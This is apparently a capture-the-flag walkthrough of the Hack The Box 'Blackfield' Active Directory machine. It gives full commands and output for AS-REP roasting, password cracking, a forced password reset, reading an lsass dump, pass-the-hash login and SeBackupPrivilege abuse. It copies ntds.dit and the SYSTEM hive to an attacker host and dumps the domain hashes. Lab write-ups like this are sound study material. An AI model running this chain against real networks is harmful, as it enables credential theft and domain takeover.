```bash
┌──(arun㉿kali)-[~]
└─$ impacket-lookupsid anonymous@10.10.10.192                   
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.10.192
[*] StringBinding ncacn_np:10.10.10.192[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4194615774-2175524697-3563712290
498: BLACKFIELD\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: BLACKFIELD\Administrator (SidTypeUser)
501: BLACKFIELD\Guest (SidTypeUser)
502: BLACKFIELD\krbtgt (SidTypeUser)
512: BLACKFIELD\Domain Admins (SidTypeGroup)
513: BLACKFIELD\Domain Users (SidTypeGroup)
514: BLACKFIELD\Domain Guests (SidTypeGroup)
515: BLACKFIELD\Domain Computers (SidTypeGroup)
516: BLACKFIELD\Domain Controllers (SidTypeGroup)
517: BLACKFIELD\Cert Publishers (SidTypeAlias)
518: BLACKFIELD\Schema Admins (SidTypeGroup)
519: BLACKFIELD\Enterprise Admins (SidTypeGroup)
520: BLACKFIELD\Group Policy Creator Owners (SidTypeGroup)
521: BLACKFIELD\Read-only Domain Controllers (SidTypeGroup)
522: BLACKFIELD\Cloneable Domain Controllers (SidTypeGroup)
525: BLACKFIELD\Protected Users (SidTypeGroup)
526: BLACKFIELD\Key Admins (SidTypeGroup)
527: BLACKFIELD\Enterprise Key Admins (SidTypeGroup)
553: BLACKFIELD\RAS and IAS Servers (SidTypeAlias)
571: BLACKFIELD\Allowed RODC Password Replication Group (SidTypeAlias)
572: BLACKFIELD\Denied RODC Password Replication Group (SidTypeAlias)
1000: BLACKFIELD\DC01$ (SidTypeUser)
1101: BLACKFIELD\DnsAdmins (SidTypeAlias)
1102: BLACKFIELD\DnsUpdateProxy (SidTypeGroup)
1103: BLACKFIELD\audit2020 (SidTypeUser)
1104: BLACKFIELD\support (SidTypeUser)
1105: BLACKFIELD\BLACKFIELD764430 (SidTypeUser)
1410: BLACKFIELD\BLACKFIELD996878 (SidTypeUser)
1411: BLACKFIELD\BLACKFIELD653097 (SidTypeUser)
1412: BLACKFIELD\BLACKFIELD438814 (SidTypeUser)
1413: BLACKFIELD\svc_backup (SidTypeUser)
1414: BLACKFIELD\lydericlefebvre (SidTypeUser)
1415: BLACKFIELD\PC01$ (SidTypeUser)
1416: BLACKFIELD\PC02$ (SidTypeUser)
1417: BLACKFIELD\PC03$ (SidTypeUser)
1418: BLACKFIELD\PC04$ (SidTypeUser)
1419: BLACKFIELD\PC05$ (SidTypeUser)
1420: BLACKFIELD\PC06$ (SidTypeUser)
1421: BLACKFIELD\PC07$ (SidTypeUser)
1422: BLACKFIELD\PC08$ (SidTypeUser)
1423: BLACKFIELD\PC09$ (SidTypeUser)
1424: BLACKFIELD\PC10$ (SidTypeUser)
1425: BLACKFIELD\PC11$ (SidTypeUser)
1426: BLACKFIELD\PC12$ (SidTypeUser)
1427: BLACKFIELD\PC13$ (SidTypeUser)
1428: BLACKFIELD\SRV-WEB$ (SidTypeUser)
1429: BLACKFIELD\SRV-FILE$ (SidTypeUser)
1430: BLACKFIELD\SRV-EXCHANGE$ (SidTypeUser)
1431: BLACKFIELD\SRV-INTRANET$ (SidTypeUser)

```


```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Blackfield]
└─$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.192 BLACKFIELD.local/ -usersfile users.txt
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:0f79a7126b40dfd6c6753a2180e918a4$1f9be0149c74da25e64aa7c7451ba2bf23266a0ef379715ec40e379ff8ee80aa9fdc1a5380e4dcecbc71b54c5dfd3bc58a234a29c38499801d51643b2b144eed77ca500cb61e7014ee09fbb8dde51765965c218d56b11a04f2d625f3aabcedfd9ae3c36ad7b06087f35ecdca53e93e2aef05a59c346037ff62917f2549d9a3b3f8fa88e589590c230cc2aeeec153f3121f189481e8652bcbe72ff2803952bd6869ace02f5e73f56225a29ec26c33f2a71f21e5e8f1575320f5e61ace872015b08925a7f4281f55e0776faeb5492cf25c3db67e84be7095b204ff39a45efac3d01fe1a1807b3c7c08dd3d21172edad3a60b7a2233
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lydericlefebvre doesn't have UF_DONT_REQUIRE_PREAUTH set

```

```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Blackfield]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt       
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 2.70% (ETA: 22:13:41) 0g/s 360857p/s 360857c/s 360857C/s 100819..081262
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:30 DONE (2023-02-09 22:13) 0.03320g/s 475928p/s 475928c/s 475928C/s #1ByNature..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed.          
```

support:#00^BlackKnight

Bloodhound-python reveals the that user support has "forcepasswordchange" to audit2020

Password restting using rpcclient

```
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Blackfield]
└─$ rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "0xarun$"'
```

```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Blackfield]
└─$ crackmapexec smb 10.10.10.192 -u audit2020 -p '0xarun$' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:0xarun$ 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 

```

```bash
smb: \memory_analysis\> ls
  .                                   D        0  Fri May 29 01:58:33 2020
  ..                                  D        0  Fri May 29 01:58:33 2020
  conhost.zip                         A 37876530  Fri May 29 01:55:36 2020
  ctfmon.zip                          A 24962333  Fri May 29 01:55:45 2020
  dfsrs.zip                           A 23993305  Fri May 29 01:55:54 2020
  dllhost.zip                         A 18366396  Fri May 29 01:56:04 2020
  ismserv.zip                         A  8810157  Fri May 29 01:56:13 2020
  lsass.zip                           A 41936098  Fri May 29 01:55:08 2020
  mmc.zip                             A 64288607  Fri May 29 01:55:25 2020
  RuntimeBroker.zip                   A 13332174  Fri May 29 01:56:24 2020
  ServerManager.zip                   A 131983313  Fri May 29 01:56:49 2020
  sihost.zip                          A 33141744  Fri May 29 01:57:00 2020
  smartscreen.zip                     A 33756344  Fri May 29 01:57:11 2020
  svchost.zip                         A 14408833  Fri May 29 01:57:19 2020
  taskhostw.zip                       A 34631412  Fri May 29 01:57:30 2020
  winlogon.zip                        A 14255089  Fri May 29 01:57:38 2020
  wlms.zip                            A  4067425  Fri May 29 01:57:44 2020
  WmiPrvSE.zip                        A 18303252  Fri May 29 01:57:53 2020


```


```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Blackfield/smb]
└─$ impacket-smbclient audit2020:'0xarun$'@10.10.10.192
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Type help for list of commands
# use forensic
# ls
drw-rw-rw-          0  Sun Feb 23 20:40:16 2020 .
drw-rw-rw-          0  Sun Feb 23 20:40:16 2020 ..
drw-rw-rw-          0  Sun Feb 23 23:44:37 2020 commands_output
drw-rw-rw-          0  Fri May 29 01:59:24 2020 memory_analysis
drw-rw-rw-          0  Sat Feb 29 04:00:34 2020 tools
# cd memory_analysis
# ls
drw-rw-rw-          0  Fri May 29 01:59:24 2020 .
drw-rw-rw-          0  Fri May 29 01:59:24 2020 ..
-rw-rw-rw-   37876530  Fri May 29 01:59:24 2020 conhost.zip
-rw-rw-rw-   24962333  Fri May 29 01:59:24 2020 ctfmon.zip
-rw-rw-rw-   23993305  Fri May 29 01:59:24 2020 dfsrs.zip
-rw-rw-rw-   18366396  Fri May 29 01:59:24 2020 dllhost.zip
-rw-rw-rw-    8810157  Fri May 29 01:59:24 2020 ismserv.zip
-rw-rw-rw-   41936098  Fri May 29 01:59:24 2020 lsass.zip
-rw-rw-rw-   64288607  Fri May 29 01:59:24 2020 mmc.zip
-rw-rw-rw-   13332174  Fri May 29 01:59:24 2020 RuntimeBroker.zip
-rw-rw-rw-  131983313  Fri May 29 01:59:24 2020 ServerManager.zip
-rw-rw-rw-   33141744  Fri May 29 01:59:24 2020 sihost.zip
-rw-rw-rw-   33756344  Fri May 29 01:59:24 2020 smartscreen.zip
-rw-rw-rw-   14408833  Fri May 29 01:59:24 2020 svchost.zip
-rw-rw-rw-   34631412  Fri May 29 01:59:24 2020 taskhostw.zip
-rw-rw-rw-   14255089  Fri May 29 01:59:24 2020 winlogon.zip
-rw-rw-rw-    4067425  Fri May 29 01:59:24 2020 wlms.zip
-rw-rw-rw-   18303252  Fri May 29 01:59:24 2020 WmiPrvSE.zip
# get lsass.zip
#

```

```bash
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD

```
	
```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Blackfield]
└─$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents>
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv
                                                                                                                                                                        
PRIVILEGES INFORMATION                                                                                                                                                  
----------------------                                                                                                                                                  
                                                                                                                                                                        
Privilege Name                Description                    State                                                                                                      
============================= ============================== =======                                                                                                    
SeMachineAccountPrivilege     Add workstations to domain     Enabled                                                                                                    
SeBackupPrivilege             Back up files and directories  Enabled                                                                                                    
SeRestorePrivilege            Restore files and directories  Enabled                                                                                                    
SeShutdownPrivilege           Shut down the system           Enabled                                                                                                    
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                                                                    
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  
```

## Privesc

SeBackupPrivilege

nano evil.dsh

	set context persistent nowriters
	add volume c: alias temp
	create
	expose %temp% z:

unix2dos evil.dsh

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd \Temp
*Evil-WinRM* PS C:\Temp> upload evil.dsh
Info: Uploading evil.dsh to C:\Temp\evil.dsh

                                                             
Data: 112 bytes of 112 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Temp> diskshadow /s evil.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  2/10/2023 6:09:01 PM

-> set context persistent nowriters
-> add volume c: alias arun
-> create
Alias arun for shadow ID {cccce62a-6ea5-4771-b33b-888648fb8252} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {e3edb0cd-e131-4d44-9792-c22c58588049} set as environment variable.

Querying all shadow copies with the shadow copy set ID {e3edb0cd-e131-4d44-9792-c22c58588049}

        * Shadow copy ID = {cccce62a-6ea5-4771-b33b-888648fb8252}               %arun%
                - Shadow copy set: {e3edb0cd-e131-4d44-9792-c22c58588049}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 2/10/2023 6:09:02 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %arun% z:
-> %arun% = {cccce62a-6ea5-4771-b33b-888648fb8252}
The shadow copy was successfully exposed as z:\.
->
*Evil-WinRM* PS C:\Temp> robocopy /b z:\windows\ntds . ntds.dit


-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Friday, February 10, 2023 6:09:55 PM
   Source : z:\windows\ntds\
     Dest : C:\Temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

```

```bash
*Evil-WinRM* PS C:\Temp> reg save hklm\system c:\Temp\system

The operation completed successfully.

*Evil-WinRM* PS C:\Temp> copy system //10.10.14.10/arun/system
*Evil-WinRM* PS C:\Temp> copy ntds.dit //10.10.14.10/arun/ntds.dit

```

```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Blackfield]
└─$ impacket-secretsdump -ntds ntds.dit -system system local 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:2a2f8ac26db968c93a17fefdb36c38ee:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e
```

